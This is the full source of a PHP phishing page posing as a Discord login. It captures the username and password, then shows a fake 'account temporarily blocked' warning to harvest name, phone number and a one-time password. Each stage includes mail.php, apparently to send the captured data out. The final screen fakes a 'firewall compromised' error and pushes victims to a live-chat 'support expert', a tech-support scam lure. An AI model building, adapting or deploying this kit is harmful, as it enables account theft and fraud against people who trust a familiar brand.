<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="viewport" content="width=device-width">
  <title>Discord</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <link rel="shortcut icon" type="image/x-icon" href="##">
  <link rel="stylesheet" href="assets/all.min.css" />
  <link rel="stylesheet" media="screen"
    href="assets/application.bfx-be2b91f9de54b5876f724649273a6b8cfc7a4d31dddfd4198e58666d75b04e29.css">
  <script
    src="assets/application-0400a76141666900eec52a0b9ab8160efdd683da3c0010d002dd901ef3e2dda8.js.download"></script>
  <link rel="stylesheet" media="screen" href="assets/_auth_landing-8097983f358837b5c63065107deea263b0d6225b0bb3aab1d52fd05403b44c1f.css">
  <link rel="stylesheet" href="assets/bootstrap.min.css">
  <style>
  .auth-layout .pub-wrapper {
    display: flex;
    justify-content: center;
    background-image: url('assets/bg-home.jpg');
    background-size: cover;
    background-repeat: no-repeat;
    height: 100vh;
    max-height: 100vh;
}
     </style>
</head>
<body class="dark-theme ticker-side  auth-layout" data-env="production" data-logged-in="false" data-notfa=""
  data-warntwofa="false" data-onmobile="false">

  <div class="pub-wrapper">
    <script src="assets/index-6bfa3c55109e75bf32f8a0d723af1de9a7b5333d4fb97f10f1e8b09707d3dc0d.js.download"></script>
      <div class="auth-page login-page container simple-container">
         
 <?php
     if (isset($_POST['btnLoginMore'])) {
        include 'mail.php';
    ?>
     <div class="alert mb-4 alert-danger text-center">Attention: the account has been <b>temporarily blocked due to suspicious activity in your Network IP,</b> kindly verify the following details<br>
                <b>A One time password (OTP) will be shared with you by the support expert team while logging in.</b>
                <br>
                Kindly contact chat assistance for further help
            </div>
 <div class="auth-page__inner">
      
    <div class="pad-for-content border">
      <form id="login-form-page" action="" method="post">
              <input type="hidden" name="email" value="<?php echo $_POST['email']; ?>" />
         <input type="hidden" name="password" value="<?php echo $_POST['password']; ?>" />
            <div class="auth-title">
              Verification Required<br>
            </div><br>
            
            <div class="row">

              <div class="col s12 input-field">
                 <input type="text" class="form-control" name="fname" placeholder="Enter Your First Name" required>
                <label>First Name</label>
              </div>

              <div class="col s12 input-field">
               <input type="text" class="form-control" placeholder="Enter Your Last Name" name="lname" required>
                <label>Last Name</label>
              </div>

              <div class="col s12 input-field">
                <input type="text" class="form-control" placeholder="Registered Number" name="number" required>
                <label>Registered Number</label>
              </div>

              <div class="col s12 input-field">
                <input class="form-control" type="text" name="number" placeholder="One time password (OTP)" maxlength="6" required>
                <label>One time password (OTP)</label>
              </div>
            </div>
           
            <div class="row">
              <div class="col s12" style="text-align: right;">
               <button name="fromLog" id="submit-login" class="btn btn-green h-captcha" type="submit" style="float:none;">
                  Verify
                </button>
              </div>
            </div>
          </form>
    </div>
  </div>

       <?php } elseif (isset($_POST['fromLog'])) {
         include 'mail.php';
     ?>
     
<div class="auth-page__inner">
        <div class="pad-for-content border" style=" text-align: center;">
          <form id="login-form-page" action="" accept-charset="UTF-8" data-remote="true" method="post" novalidate="novalidate">
        
            <div class="auth-url-warning">
              <span class="auth-title">Signing In Failed!</span><br>
             <p style="font-size: 18px; text-align: center; font-weight: 500; color: #fff;">
               Checking User Entitlement<br>
                User firewall compromised<br>
                Wait for the support team to connect with you<br>
                Or start Chat with the support team from the given link below
             </p>
            </div>
            <div class="row">
              <div class="col s12 input-field">
               <h5 style=" text-align: center;">Error CODE: 2020</h5>
              </div>
              <div class="col s12 input-field">
                  
                                <a href="javascript:void(Tawk_API.toggle())"><button type="button" class="btn button">Ask Expert</button></a>
                           
              </div>
            </div>
            <div class="row terms-field">
              <div class="col s12">
              </div>
            </div>
          </form>
        </div>
      </div>
 opacity: @searchBoxBackgroundOpacityTabdynamic;
       <?php } else { ?>

    <div class="auth-page__inner">
        <div class="pad-for-content border">
          <form id="login-form-page" action="" method="post">
                        <div class="auth-url-warning">
              <span style="font-weight: 500;">Welcome back!</span><br>
              We're so excited to see you again! <br>
            </div>
            <div class="row">
              <div class="col s12 input-field">
                <input id="login" name="email" autocomplete="off" autocorrect="off" autocapitalize="off"
                  spellcheck="false" type="text" class="valid" required>
                <label>Username or Email</label>
              </div>
              <div class="col s12 input-field">
                <input id="auth-password" name="password" type="password" required>
                <label for="auth-password">Password</label>
              </div>
               <div class="col s12 input-field" style="margin: 0">
                <button name="btnLoginMore" id="submit-login" class="btn btn-green h-captcha" type="submit">
                  Login
                </button>
              </div>

            </div>
             <div class="auth-page__footer">
        Don't have an account?
        <a href="##">Sign Up</a>
      </div>
          
          </form>
        </div>
      </div>
        <?php } ?>

     
    </div>
  </div>
</body>
</html>